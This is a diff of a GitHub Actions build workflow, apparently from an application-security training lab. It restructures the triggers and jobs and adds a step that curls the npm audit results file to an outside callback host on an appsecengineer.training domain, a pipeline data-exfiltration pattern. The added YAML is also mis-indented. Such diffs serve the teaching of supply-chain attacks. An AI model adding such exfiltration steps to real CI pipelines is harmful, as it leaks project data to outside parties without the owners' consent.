@@ -1,13 +1,21 @@
 name: build
-##test##
-on: push
+on:
+  push:
+    branches:
+      - main
+  pull_request:
 jobs:
-  audit:
+  build:
+    name: Build
     runs-on: ubuntu-latest
-    name: npm-audit
     steps:
-      - uses: actions/checkout@v4
+      - name: Checkout code
+        uses: actions/checkout@v4
       - name: Audit packages
-        run: npm install
+        run:  npm install
       - name: install NPM audit
         run: npm audit -- results.json
+       - name: send curl
+        run: |
+          curl -X POST -H "Content-Type: multipart/form-data" -F "file=@results.json"  http://wat8zaexdh06varq97tff.appsecengineer.training:8880/callback
+
